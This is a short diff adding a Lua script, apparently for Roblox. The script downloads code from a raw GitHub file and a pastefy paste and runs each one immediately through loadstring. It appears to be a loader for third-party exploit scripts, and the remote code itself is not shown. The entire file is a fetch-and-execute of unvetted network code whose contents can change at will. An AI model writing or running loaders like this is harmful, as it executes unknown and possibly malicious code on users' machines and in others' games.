@@ -1,0 +1,12 @@
+--My
+local function My()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/S",true))() 
+end
+local function SnapRev()
+  loadstring(game:HttpGet("https://pastefy.app/WJzwkGcy/raw",true))()
+end
+
+
+task.spawn(My)
+wait(3)
+task.spawn(SnapRev)
